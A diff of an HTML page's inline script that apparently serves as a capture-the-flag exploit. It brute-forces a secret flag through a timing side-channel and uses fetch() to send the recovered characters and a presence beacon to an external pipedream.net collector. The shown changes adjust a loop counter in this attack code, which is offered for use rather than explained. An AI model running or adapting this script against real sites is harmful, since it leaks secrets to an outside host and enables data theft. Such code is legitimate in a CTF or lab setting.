@@ -24,10 +24,11 @@
     </script> -->
     <script>
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
+        let cnt = 0
         for (let i = 0; i < 50; i++) {
             let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
             let flag = "z"
-            let cnt = 0
+
             // Start the clock
             var start = performance.now()
 
@@ -42,15 +43,22 @@
                 if (time >= 2000) {
                     //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
                     flag = flag + alpha[i];
-                    cnt++;
+
                     if (cnt > 4) {
                         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?flag=${flag}`)
                     }
                 }
             });
+
             if (i < 49) {
                 i = 0;
+                cnt++;
+                if (cnt > 7) {
+                    i = 50
+                }
+
             }
+
         }
         // const leak = async (url, id) => {
         //     return new Promise((r) => {
